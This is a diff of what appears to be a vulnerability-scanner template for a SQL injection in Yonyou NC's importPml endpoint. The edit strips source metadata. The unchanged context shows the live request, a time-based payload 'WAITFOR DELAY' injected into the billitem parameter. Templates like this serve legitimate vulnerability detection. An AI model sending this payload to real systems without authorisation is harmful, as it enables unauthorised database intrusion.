@@ -3,13 +3,8 @@ info:
   name: 用友NC importPml SQL注入漏洞_vu9ow1zdutfcgbtp
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
 http:
 - raw:
   - 'POST /portal/pt/portalpage/importPml?pageId=login&billitem=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
@@ -46,9 +41,6 @@ http:
 
 
     ------WebKitFormBoundaryH970hbttBhoCyj9V--
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058319037-97bb3ae0-c772-4b0d-b02a-1cc97dcdcd92.png)
 
 
     ## 修复建议
